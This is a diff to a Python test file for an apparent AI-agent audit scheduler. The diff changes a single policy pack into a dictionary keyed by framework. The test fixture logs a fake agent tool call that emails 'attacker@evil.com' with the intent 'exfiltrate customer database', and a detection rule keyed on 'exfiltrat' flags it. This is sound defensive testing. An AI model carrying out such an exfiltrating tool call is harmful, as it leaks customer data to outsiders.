@@ -41,12 +41,12 @@ def test_run_due_schedules_audits_pro_orgs_and_marks_last_run():
     store.append(org, Event(agent_id="a", session_id="sched-sess", kind="tool_call",
                             tool="send_email", args={"to": "attacker@evil.com"},
                             intent="exfiltrate customer database"))
-    pack = PolicyPack(framework="Test", version="1", rules=[
+    packs = {"eu_ai_act": PolicyPack(framework="Test", version="1", rules=[
         Rule(id="data_exfiltration", description="d", severity="critical",
             framework_ref="X", detector_hint="", keywords=["exfiltrat"]),
-    ])
+    ])}
 
-    ran = run_due_schedules(store, pack)
+    ran = run_due_schedules(store, packs)
     assert ran == {org: 1}
     assert any(v.violation for v in store.verdicts(org, "sched-sess"))
     assert get_schedule(org)["last_run_at"] is not None
@@ -56,6 +56,6 @@ def test_run_due_schedules_skips_downgraded_org():
     org = create_org("Acme", "u5")   # stays on free plan
     set_schedule(org, enabled=True, interval_minutes=15)
     store = Store()
-    pack = PolicyPack(framework="Test", version="1", rules=[])
-    ran = run_due_schedules(store, pack)
+    packs = {"eu_ai_act": PolicyPack(framework="Test", version="1", rules=[])}
+    ran = run_due_schedules(store, packs)
     assert org not in ran
